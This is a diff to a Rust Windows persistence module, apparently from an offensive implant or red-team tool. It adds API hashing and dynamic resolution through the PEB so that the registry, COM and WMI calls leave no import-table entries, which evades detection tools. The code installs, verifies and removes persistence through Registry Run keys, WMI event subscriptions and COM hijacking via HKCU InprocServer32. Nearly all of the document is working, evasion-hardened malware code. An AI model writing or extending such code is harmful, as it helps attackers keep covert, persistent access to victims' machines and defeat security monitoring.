@@ -116,6 +116,222 @@ pub mod windows {
     use std::path::PathBuf;
     use std::ptr;
 
+    // ── Dynamic API resolution (no IAT entries) ──────────────────────────
+    //
+    // All win32 function calls that would produce IAT entries are resolved
+    // at runtime via pe_resolve hashing.  Only type definitions remain from
+    // winapi — no function imports.
+
+    use winapi::shared::guiddef::GUID;
+    use winapi::shared::minwindef::{DWORD, HMODULE};
+    use winapi::shared::winerror::HRESULT;
+    use winapi::um::winnt::{HANDLE, LONG};
+
+    /// Resolve a function pointer from a DLL that is already loaded (in PEB).
+    #[inline(always)]
+    unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
+        let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+        let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
+        Some(std::mem::transmute::<_, T>(fn_addr))
+    }
+
+    /// Resolve a function from a DLL that may not be in the PEB yet.
+    /// First tries PEB lookup; if that fails, loads the DLL via kernel32's
+    /// LoadLibraryW, then resolves the function.
+    #[inline(always)]
+    unsafe fn resolve_api_or_load<T>(
+        dll_wide: &[u16],
+        dll_hash: u32,
+        fn_hash: u32,
+    ) -> Option<T> {
+        if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
+            if let Some(addr) = pe_resolve::get_proc_address_by_hash(base, fn_hash) {
+                return Some(std::mem::transmute::<_, T>(addr));
+            }
+        }
+        // DLL not loaded — use LoadLibraryW from kernel32.
+        let load_library_w: FnLoadLibraryW = {
+            let base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+            let addr = pe_resolve::get_proc_address_by_hash(
+                base,
+                pe_resolve::hash_str(b"LoadLibraryW\0"),
+            )?;
+            std::mem::transmute::<_, FnLoadLibraryW>(addr)
+        };
+        let _hmod = load_library_w(dll_wide.as_ptr());
+        let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+        let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
+        Some(std::mem::transmute::<_, T>(fn_addr))
+    }
+
+    // ── DLL hash constants (not in pe_resolve build.rs) ──────────────────
+    //
+    // Computed at compile-time via const fn mirroring pe_resolve::hash_wstr.
+
+    const fn hash_str_const(bytes: &[u8]) -> u32 {
+        let seed: u32 = pe_resolve::SEED;
+        let mut hash: u32 = seed;
+        let mut i: usize = 0;
+        while i < bytes.len() {
+            let b = bytes[i];
+            if b == 0 { break; }
+            hash = hash.rotate_right(13) ^ (b.to_ascii_lowercase() as u32);
+            i += 1;
+        }
+        hash
+    }
+
+    const fn hash_wstr_const(units: &[u16]) -> u32 {
+        let seed: u32 = pe_resolve::SEED;
+        let mut hash: u32 = seed;
+        let mut i: usize = 0;
+        while i < units.len() {
+            let c = units[i];
+            if c == 0 { break; }
+            let lo = (c as u8).to_ascii_lowercase();
+            let hi = ((c >> 8) as u8).to_ascii_lowercase();
+            hash = hash.rotate_right(13) ^ (lo as u32);
+            hash = hash.rotate_right(13) ^ (hi as u32);
+            i += 1;
+        }
+        hash
+    }
+
+    /// "advapi32.dll" wide (no null)
+    const ADVAPI32_W: &[u16] = &[
+        b'a' as u16, b'd' as u16, b'v' as u16, b'a' as u16, b'p' as u16,
+        b'i' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
+        b'l' as u16, b'l' as u16,
+    ];
+    const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_W);
+
+    /// "ole32.dll" wide (no null)
+    const OLE32_W: &[u16] = &[
+        b'o' as u16, b'l' as u16, b'e' as u16, b'3' as u16, b'2' as u16,
+        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+    ];
+    const HASH_OLE32_DLL: u32 = hash_wstr_const(OLE32_W);
+
+    /// "oleaut32.dll" wide (no null)
+    const OLEAUT32_W: &[u16] = &[
+        b'o' as u16, b'l' as u16, b'e' as u16, b'a' as u16, b'u' as u16,
+        b't' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
+        b'l' as u16, b'l' as u16,
+    ];
+    const HASH_OLEAUT32_DLL: u32 = hash_wstr_const(OLEAUT32_W);
+
+    // ── API name hashes ──────────────────────────────────────────────────
+
+    const HASH_REGOPENKEYEXW: u32 = hash_str_const(b"RegOpenKeyExW\0");
+    const HASH_REGSETVALUEEXW: u32 = hash_str_const(b"RegSetValueExW\0");
+    const HASH_REGCLOSEKEY: u32 = hash_str_const(b"RegCloseKey\0");
+    const HASH_REGDELETEVALUEW: u32 = hash_str_const(b"RegDeleteValueW\0");
+    const HASH_REGQUERYVALUEEXW: u32 = hash_str_const(b"RegQueryValueExW\0");
+    const HASH_REGCREATEKEYEXW: u32 = hash_str_const(b"RegCreateKeyExW\0");
+    const HASH_REGDELETETREEW: u32 = hash_str_const(b"RegDeleteTreeW\0");
+
+    const HASH_COCREATEINSTANCE: u32 = hash_str_const(b"CoCreateInstance\0");
+    const HASH_COSETPROXYBLANKET: u32 = hash_str_const(b"CoSetProxyBlanket\0");
+    const HASH_COINITIALIZEEX: u32 = hash_str_const(b"CoInitializeEx\0");
+    const HASH_COUNINITIALIZE: u32 = hash_str_const(b"CoUninitialize\0");
+
+    const HASH_SYSALLOCSTRINGLEN: u32 = hash_str_const(b"SysAllocStringLen\0");
+    const HASH_SYSFREESTRING: u32 = hash_str_const(b"SysFreeString\0");
+    const HASH_VARIANTCLEAR: u32 = hash_str_const(b"VariantClear\0");
+    const HASH_GETMODULEHANDLEEXW: u32 = hash_str_const(b"GetModuleHandleExW\0");
+
+    // ── Function pointer types ──────────────────────────────────────────
+
+    type FnLoadLibraryW = unsafe extern "system" fn(*const u16) -> HMODULE;
+
+    type FnRegOpenKeyExW = unsafe extern "system" fn(
+        HANDLE, *const u16, u32, u32, *mut HANDLE,
+    ) -> i32;
+
+    type FnRegSetValueExW = unsafe extern "system" fn(
+        HANDLE, *const u16, u32, u32, *const u8, u32,
+    ) -> i32;
+
+    type FnRegCloseKey = unsafe extern "system" fn(HANDLE) -> i32;
+
+    type FnRegDeleteValueW = unsafe extern "system" fn(
+        HANDLE, *const u16,
+    ) -> i32;
+
+    type FnRegQueryValueExW = unsafe extern "system" fn(
+        HANDLE, *const u16, *mut u32, *mut u32, *mut u8, *mut u32,
+    ) -> i32;
+
+    type FnRegCreateKeyExW = unsafe extern "system" fn(
+        HANDLE, *const u16, u32, *mut u16, u32, u32,
+        *mut std::ffi::c_void, *mut HANDLE, *mut u32,
+    ) -> i32;
+
+    type FnRegDeleteTreeW = unsafe extern "system" fn(
+        HANDLE, *const u16,
+    ) -> i32;
+
+    type FnCoCreateInstance = unsafe extern "system" fn(
+        *const GUID, *mut std::ffi::c_void, DWORD, *const GUID, *mut *mut std::ffi::c_void,
+    ) -> HRESULT;
+
+    type FnCoSetProxyBlanket = unsafe extern "system" fn(
+        *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void,
+        u32, u32, *mut std::ffi::c_void, u32,
+    ) -> HRESULT;
+
+    type FnCoInitializeEx = unsafe extern "system" fn(
+        *mut std::ffi::c_void, DWORD,
+    ) -> HRESULT;
+
+    type FnCoUninitialize = unsafe extern "system" fn();
+
+    type FnSysAllocStringLen = unsafe extern "system" fn(
+        *const u16, u32,
+    ) -> *mut u16;
+
+    type FnSysFreeString = unsafe extern "system" fn(*mut u16);
+
+    type FnVariantClear = unsafe extern "system" fn(*mut std::ffi::c_void) -> HRESULT;
+
+    type FnGetModuleHandleExW = unsafe extern "system" fn(
+        u32, *const u16, *mut HMODULE,
+    ) -> i32;
+
+    // Wide strings for DLL loading (null-terminated)
+    const ADVAPI32_DLL_W: &[u16] = &[
+        b'a' as u16, b'd' as u16, b'v' as u16, b'a' as u16, b'p' as u16,
+        b'i' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
+        b'l' as u16, b'l' as u16, 0,
+    ];
+    const OLE32_DLL_W: &[u16] = &[
+        b'o' as u16, b'l' as u16, b'e' as u16, b'3' as u16, b'2' as u16,
+        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0,
+    ];
+    const OLEAUT32_DLL_W: &[u16] = &[
+        b'o' as u16, b'l' as u16, b'e' as u16, b'a' as u16, b'u' as u16,
+        b't' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
+        b'l' as u16, b'l' as u16, 0,
+    ];
+
+    // ── Resolved API helpers (resolve once, use via closure / local) ────
+
+    /// Resolve all registry API function pointers. Returns None if any
+    /// resolution fails.
+    #[inline(always)]
+    unsafe fn registry_apis() -> Option<(FnRegOpenKeyExW, FnRegSetValueExW, FnRegCloseKey)> {
+        let open: FnRegOpenKeyExW = resolve_api_or_load(
+            ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGOPENKEYEXW,
+        )?;
+        let set: FnRegSetValueExW = resolve_api_or_load(
+            ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGSETVALUEEXW,
+        )?;
+        let close: FnRegCloseKey = resolve_api_or_load(
+            ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGCLOSEKEY,
+        )?;
+        Some((open, set, close))
+    }
+
     // ── FR-1A: Registry Run Keys ──────────────────────────────────────────────
     pub struct RegistryRunKey {
         pub value_name: String,
@@ -132,10 +348,9 @@ pub mod windows {
 
     impl Persist for RegistryRunKey {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            use winapi::um::winnt::{KEY_WRITE, REG_SZ};
-            use winapi::um::winreg::{
-                RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER,
-            };
+            const KEY_WRITE: u32 = 0x00020006;
+            const REG_SZ: u32 = 1;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
 
             let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                 .encode_utf16()
@@ -149,16 +364,19 @@ pub mod windows {
                 .collect();
 
             unsafe {
+                let (reg_open, reg_set, reg_close) = registry_apis().ok_or_else(|| {
+                    anyhow!("RegistryRunKey::install: failed to resolve registry APIs")
+                })?;
+
                 let mut hkey = ptr::null_mut();
-                let ret =
-                    RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
+                let ret = reg_open(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
                 if ret != 0 {
                     return Err(anyhow!(
                         "RegistryRunKey::install: RegOpenKeyExW failed: {}",
                         ret
                     ));
                 }
-                let set_ret = RegSetValueExW(
+                let set_ret = reg_set(
                     hkey,
                     val_name.as_ptr(),
                     0,
@@ -166,7 +384,7 @@ pub mod windows {
                     val_wide.as_ptr() as _,
                     (val_wide.len() * 2) as u32,
                 );
-                RegCloseKey(hkey);
+                reg_close(hkey);
                 if set_ret != 0 {
                     return Err(anyhow!(
                         "RegistryRunKey::install: RegSetValueExW failed: {}",
@@ -183,10 +401,8 @@ pub mod windows {
         }
 
         fn remove(&self) -> Result<()> {
-            use winapi::um::winnt::KEY_WRITE;
-            use winapi::um::winreg::{
-                RegCloseKey, RegDeleteValueW, RegOpenKeyExW, HKEY_CURRENT_USER,
-            };
+            const KEY_WRITE: u32 = 0x00020006;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
 
             let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                 .encode_utf16()
@@ -198,27 +414,31 @@ pub mod windows {
                 .collect();
 
             unsafe {
+                let (reg_open, _, reg_close) = registry_apis().ok_or_else(|| {
+                    anyhow!("RegistryRunKey::remove: failed to resolve registry APIs")
+                })?;
+                let reg_del: FnRegDeleteValueW = resolve_api_or_load(
+                    ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGDELETEVALUEW,
+                ).ok_or_else(|| anyhow!("RegistryRunKey::remove: failed to resolve RegDeleteValueW"))?;
+
                 let mut hkey = ptr::null_mut();
-                let ret =
-                    RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
+                let ret = reg_open(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
                 if ret != 0 {
                     return Err(anyhow!(
                         "RegistryRunKey::remove: RegOpenKeyExW failed: {}",
                         ret
                     ));
                 }
-                RegDeleteValueW(hkey, val_name.as_ptr());
-                RegCloseKey(hkey);
+                reg_del(hkey, val_name.as_ptr());
+                reg_close(hkey);
             }
             log::info!("RegistryRunKey::remove: deleted '{}'", self.value_name);
             Ok(())
         }
 
         fn verify(&self) -> Result<bool> {
-            use winapi::um::winnt::KEY_READ;
-            use winapi::um::winreg::{
-                RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER,
-            };
+            const KEY_READ: u32 = 0x00020019;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
 
             let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                 .encode_utf16()
@@ -233,11 +453,18 @@ pub mod windows {
             let mut val_type: u32 = 0;
 
             unsafe {
+                let (reg_open, _, reg_close) = registry_apis().ok_or_else(|| {
+                    anyhow!("RegistryRunKey::verify: failed to resolve registry APIs")
+                })?;
+                let reg_query: FnRegQueryValueExW = resolve_api_or_load(
+                    ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGQUERYVALUEEXW,
+                ).ok_or_else(|| anyhow!("RegistryRunKey::verify: failed to resolve RegQueryValueExW"))?;
+
                 let mut hkey = ptr::null_mut();
-                if RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_READ, &mut hkey) != 0 {
+                if reg_open(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_READ, &mut hkey) != 0 {
                     return Ok(false);
                 }
-                let ret = RegQueryValueExW(
+                let ret = reg_query(
                     hkey,
                     val_name.as_ptr(),
                     ptr::null_mut(),
@@ -245,7 +472,7 @@ pub mod windows {
                     buf.as_mut_ptr() as _,
                     &mut buf_len,
                 );
-                RegCloseKey(hkey);
+                reg_close(hkey);
                 Ok(ret == 0 && buf_len > 0)
             }
         }
@@ -391,16 +618,20 @@ pub mod windows {
 
     // Helper: allocate a BSTR from a Rust &str
     unsafe fn alloc_bstr(s: &str) -> BSTR {
-        use winapi::um::oleauto::SysAllocStringLen;
+        let sys_alloc: FnSysAllocStringLen = resolve_api_or_load(
+            OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_SYSALLOCSTRINGLEN,
+        ).expect("alloc_bstr: failed to resolve SysAllocStringLen");
         let wide: Vec<u16> = s.encode_utf16().collect();
-        SysAllocStringLen(wide.as_ptr(), wide.len() as u32)
+        sys_alloc(wide.as_ptr(), wide.len() as u32)
     }
 
     // Helper: free a BSTR (null-safe)
     unsafe fn free_bstr(b: BSTR) {
-        use winapi::um::oleauto::SysFreeString;
+        let sys_free: FnSysFreeString = resolve_api_or_load(
+            OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_SYSFREESTRING,
+        ).expect("free_bstr: failed to resolve SysFreeString");
         if !b.is_null() {
-            SysFreeString(b);
+            sys_free(b);
         }
     }
 
@@ -450,7 +681,10 @@ pub mod windows {
             let len = (0..).take_while(|&i| *bstr.add(i) != 0).count();
             String::from_utf16_lossy(std::slice::from_raw_parts(bstr, len))
         };
-        winapi::um::oleauto::VariantClear(&mut var);
+        let variant_clear: FnVariantClear = resolve_api_or_load(
+            OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_VARIANTCLEAR,
+        ).expect("get_bstr_prop: failed to resolve VariantClear");
+        variant_clear(&mut var as *mut _ as *mut std::ffi::c_void);
         Ok(s)
     }
 
@@ -479,10 +713,13 @@ pub mod windows {
             *mut *mut IWbemClassObject,
         ) -> winapi::shared::winerror::HRESULT,
     > {
-        use winapi::um::libloaderapi::{
-            GetModuleHandleExW, GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
-            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
-        };
+        const GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS: u32 = 0x00000004;
+        const GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT: u32 = 0x00000002;
+
+        // Resolve GetModuleHandleExW dynamically (kernel32)
+        let get_module_handle_ex: FnGetModuleHandleExW = resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL, HASH_GETMODULEHANDLEEXW,
+        ).expect("resolve_spawn_instance: failed to resolve GetModuleHandleExW");
 
         // Read the vtable pointer from the object header.
         let vtbl = *(class_obj as *const *const usize);
@@ -510,8 +747,8 @@ pub mod windows {
         let mut hmod_0: winapi::shared::minwindef::HMODULE = std::ptr::null_mut();
         let mut hmod_16: winapi::shared::minwindef::HMODULE = std::ptr::null_mut();
 
-        let ok0 = GetModuleHandleExW(flags, entry_0 as *const _, &mut hmod_0);
-        let ok16 = GetModuleHandleExW(flags, entry_16 as *const _, &mut hmod_16);
+        let ok0 = get_module_handle_ex(flags, entry_0 as *const _, &mut hmod_0);
+        let ok16 = get_module_handle_ex(flags, entry_16 as *const _, &mut hmod_16);
 
         if ok0 == 0 || ok16 == 0 {
             log::warn!(
@@ -655,15 +892,27 @@ pub mod windows {
         exe_path: &str,
     ) -> Result<()> {
         use winapi::shared::winerror::SUCCEEDED;
-        use winapi::um::combaseapi::{CoCreateInstance, CoSetProxyBlanket};
-        use winapi::shared::rpcdce::{RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE};
+        // COM security constants
+        const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
+        const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
+        const RPC_C_AUTHN_WINNT: u32 = 10;
+        const RPC_C_AUTHZ_NONE: u32 = 0;
+        const CLSCTX_INPROC_SERVER: u32 = 1;
+
+        // Resolve COM APIs dynamically
+        let co_create: FnCoCreateInstance = resolve_api_or_load(
+            OLE32_DLL_W, HASH_OLE32_DLL, HASH_COCREATEINSTANCE,
+        ).ok_or_else(|| anyhow!("wmi_install_com: failed to resolve CoCreateInstance"))?;
+        let co_set_blanket: FnCoSetProxyBlanket = resolve_api_or_load(
+            OLE32_DLL_W, HASH_OLE32_DLL, HASH_COSETPROXYBLANKET,
+        ).ok_or_else(|| anyhow!("wmi_install_com: failed to resolve CoSetProxyBlanket"))?;
 
         // Step 1: CoCreateInstance(CLSID_WbemLocator)
         let mut locator_ptr: *mut IWbemLocator = ptr::null_mut();
-        let hr = CoCreateInstance(
+        let hr = co_create(
             &CLSID_WBEM_LOCATOR,
             ptr::null_mut(),
-            winapi::um::combaseapi::CLSCTX_INPROC_SERVER,
+            CLSCTX_INPROC_SERVER,
             &IID_IWBEM_LOCATOR,
             &mut locator_ptr as *mut _ as *mut *mut std::ffi::c_void,
         );
@@ -693,7 +942,7 @@ pub mod windows {
         }
 
         // Step 3: Set proxy blanket on IWbemServices
-        let hr = CoSetProxyBlanket(
+        let hr = co_set_blanket(
             services_ptr as *mut IUnknown,
             RPC_C_AUTHN_WINNT,
             RPC_C_AUTHZ_NONE,
@@ -842,15 +1091,23 @@ pub mod windows {
     // when done.
     unsafe fn wmi_connect() -> Result<(*mut IWbemLocator, *mut IWbemServices)> {
         use winapi::shared::winerror::SUCCEEDED;
-        use winapi::um::combaseapi::{CoCreateInstance, CoSetProxyBlanket};
-        use winapi::shared::rpcdce::{
-            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
-            RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
-        };
-        use winapi::um::combaseapi::CLSCTX_INPROC_SERVER;
+        // COM security constants
+        const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
+        const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
+        const RPC_C_AUTHN_WINNT: u32 = 10;
+        const RPC_C_AUTHZ_NONE: u32 = 0;
+        const CLSCTX_INPROC_SERVER: u32 = 1;
+
+        // Resolve COM APIs dynamically
+        let co_create: FnCoCreateInstance = resolve_api_or_load(
+            OLE32_DLL_W, HASH_OLE32_DLL, HASH_COCREATEINSTANCE,
+        ).ok_or_else(|| anyhow!("wmi_connect: failed to resolve CoCreateInstance"))?;
+        let co_set_blanket: FnCoSetProxyBlanket = resolve_api_or_load(
+            OLE32_DLL_W, HASH_OLE32_DLL, HASH_COSETPROXYBLANKET,
+        ).ok_or_else(|| anyhow!("wmi_connect: failed to resolve CoSetProxyBlanket"))?;
 
         let mut locator_ptr: *mut IWbemLocator = ptr::null_mut();
-        let hr = CoCreateInstance(
+        let hr = co_create(
             &CLSID_WBEM_LOCATOR,
             ptr::null_mut(),
             CLSCTX_INPROC_SERVER,
@@ -880,7 +1137,7 @@ pub mod windows {
             return Err(anyhow!("IWbemLocator::ConnectServer failed: 0x{:08X}", hr));
         }
 
-        let hr = CoSetProxyBlanket(
+        let hr = co_set_blanket(
             services_ptr as *mut IUnknown,
             RPC_C_AUTHN_WINNT,
             RPC_C_AUTHZ_NONE,
@@ -1071,8 +1328,7 @@ pub mod windows {
     impl Persist for WmiSubscription {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             use winapi::shared::winerror::SUCCEEDED;
-            use winapi::um::combaseapi::{CoInitializeEx, CoUninitialize};
-            use winapi::um::objbase::COINIT_MULTITHREADED;
+            const COINIT_MULTITHREADED: u32 = 0x0;
 
             let exe_path = executable_path.to_string_lossy();
             log::info!(
@@ -1083,7 +1339,14 @@ pub mod windows {
 
             unsafe {
                 const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
-                let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
+                let co_init: FnCoInitializeEx = resolve_api_or_load(
+                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX,
+                ).ok_or_else(|| anyhow!("WmiSubscription::install: failed to resolve CoInitializeEx"))?;
+                let co_uninit: FnCoUninitialize = resolve_api_or_load(
+                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE,
+                ).ok_or_else(|| anyhow!("WmiSubscription::install: failed to resolve CoUninitialize"))?;
+
+                let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
                 // S_OK      — COM initialised successfully; we own it and must
                 //              call CoUninitialize when done.
                 // S_FALSE   — COM already initialised on this thread (same apartment);
@@ -1113,7 +1376,7 @@ pub mod windows {
                     );
                 }
                 if should_uninitialize {
-                    CoUninitialize();
+                    co_uninit();
                 }
                 result?;
 
@@ -1124,12 +1387,18 @@ pub mod windows {
 
         fn remove(&self) -> Result<()> {
             use winapi::shared::winerror::SUCCEEDED;
-            use winapi::um::combaseapi::{CoInitializeEx, CoUninitialize};
-            use winapi::um::objbase::COINIT_MULTITHREADED;
+            const COINIT_MULTITHREADED: u32 = 0x0;
 
             unsafe {
                 const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
-                let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
+                let co_init: FnCoInitializeEx = resolve_api_or_load(
+                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX,
+                ).ok_or_else(|| anyhow!("WmiSubscription::remove: failed to resolve CoInitializeEx"))?;
+                let co_uninit: FnCoUninitialize = resolve_api_or_load(
+                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE,
+                ).ok_or_else(|| anyhow!("WmiSubscription::remove: failed to resolve CoUninitialize"))?;
+
+                let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
                 let should_uninitialize = SUCCEEDED(hr);
                 if !should_uninitialize && hr != RPC_E_CHANGED_MODE {
                     return Err(anyhow!(
@@ -1143,7 +1412,7 @@ pub mod windows {
                     log::warn!("WmiSubscription::remove: COM path failed ({})", e);
                 }
                 if should_uninitialize {
-                    CoUninitialize();
+                    co_uninit();
                 }
                 result?;
             }
@@ -1156,12 +1425,18 @@ pub mod windows {
 
         fn verify(&self) -> Result<bool> {
             use winapi::shared::winerror::SUCCEEDED;
-            use winapi::um::combaseapi::{CoInitializeEx, CoUninitialize};
-            use winapi::um::objbase::COINIT_MULTITHREADED;
+            const COINIT_MULTITHREADED: u32 = 0x0;
 
             unsafe {
                 const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
-                let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
+                let co_init: FnCoInitializeEx = resolve_api_or_load(
+                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX,
+                ).ok_or_else(|| anyhow!("WmiSubscription::verify: failed to resolve CoInitializeEx"))?;
+                let co_uninit: FnCoUninitialize = resolve_api_or_load(
+                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE,
+                ).ok_or_else(|| anyhow!("WmiSubscription::verify: failed to resolve CoUninitialize"))?;
+
+                let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
                 let should_uninitialize = SUCCEEDED(hr);
                 if !should_uninitialize && hr != RPC_E_CHANGED_MODE {
                     return Err(anyhow!(
@@ -1172,7 +1447,7 @@ pub mod windows {
 
                 let result = wmi_verify_com(&self.subscription_name);
                 if should_uninitialize {
-                    CoUninitialize();
+                    co_uninit();
                 }
                 result
             }
@@ -1207,10 +1482,9 @@ pub mod windows {
                     executable_path.display()
                 ));
             }
-            use winapi::um::winnt::{KEY_WRITE, REG_SZ};
-            use winapi::um::winreg::{
-                RegCloseKey, RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER,
-            };
+            const KEY_WRITE: u32 = 0x00020006;
+            const REG_SZ: u32 = 1;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
 
             let subkey: Vec<u16> =
                 format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
@@ -1223,8 +1497,15 @@ pub mod windows {
                 .collect();
 
             unsafe {
+                let (_, reg_set, reg_close) = registry_apis().ok_or_else(|| {
+                    anyhow!("ComHijacking::install: failed to resolve registry APIs")
+                })?;
+                let reg_create: FnRegCreateKeyExW = resolve_api_or_load(
+                    ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGCREATEKEYEXW,
+                ).ok_or_else(|| anyhow!("ComHijacking::install: failed to resolve RegCreateKeyExW"))?;
+
                 let mut hkey = ptr::null_mut();
-                let ret = RegCreateKeyExW(
+                let ret = reg_create(
                     HKEY_CURRENT_USER,
                     subkey.as_ptr(),
                     0,
@@ -1241,7 +1522,7 @@ pub mod windows {
                         ret
                     ));
                 }
-                RegSetValueExW(
+                reg_set(
                     hkey,
                     ptr::null(),
                     0,
@@ -1252,7 +1533,7 @@ pub mod windows {
                 // Set ThreadingModel
                 let tm_name: Vec<u16> = "ThreadingModel\0".encode_utf16().collect();
                 let tm_val: Vec<u16> = "Apartment\0".encode_utf16().collect();
-                RegSetValueExW(
+                reg_set(
                     hkey,
                     tm_name.as_ptr(),
                     0,
@@ -1260,7 +1541,7 @@ pub mod windows {
                     tm_val.as_ptr() as _,
                     ((tm_val.len() - 1) * 2) as u32,
                 );
-                RegCloseKey(hkey);
+                reg_close(hkey);
             }
             log::info!(
                 "ComHijacking::install: CLSID {} → '{}'",
@@ -1271,31 +1552,37 @@ pub mod windows {
         }
 
         fn remove(&self) -> Result<()> {
-            use winapi::um::winreg::{RegDeleteTreeW, HKEY_CURRENT_USER};
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
 
             let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\0", self.clsid)
                 .encode_utf16()
                 .collect();
             unsafe {
-                RegDeleteTreeW(HKEY_CURRENT_USER, subkey.as_ptr());
+                let reg_delete_tree: FnRegDeleteTreeW = resolve_api_or_load(
+                    ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGDELETETREEW,
+                ).ok_or_else(|| anyhow!("ComHijacking::remove: failed to resolve RegDeleteTreeW"))?;
+                reg_delete_tree(HKEY_CURRENT_USER, subkey.as_ptr());
             }
             log::info!("ComHijacking::remove: removed CLSID {}", self.clsid);
             Ok(())
         }
 
         fn verify(&self) -> Result<bool> {
-            use winapi::um::winnt::KEY_READ;
-            use winapi::um::winreg::{RegCloseKey, RegOpenKeyExW, HKEY_CURRENT_USER};
+            const KEY_READ: u32 = 0x00020019;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
 
             let subkey: Vec<u16> =
                 format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
                     .encode_utf16()
                     .collect();
             unsafe {
+                let (reg_open, _, reg_close) = registry_apis().ok_or_else(|| {
+                    anyhow!("ComHijacking::verify: failed to resolve registry APIs")
+                })?;
                 let mut hkey = ptr::null_mut();
-                let ret = RegOpenKeyExW(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut hkey);
+                let ret = reg_open(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut hkey);
                 if ret == 0 {
-                    RegCloseKey(hkey);
+                    reg_close(hkey);
                     Ok(true)
                 } else {
                     Ok(false)
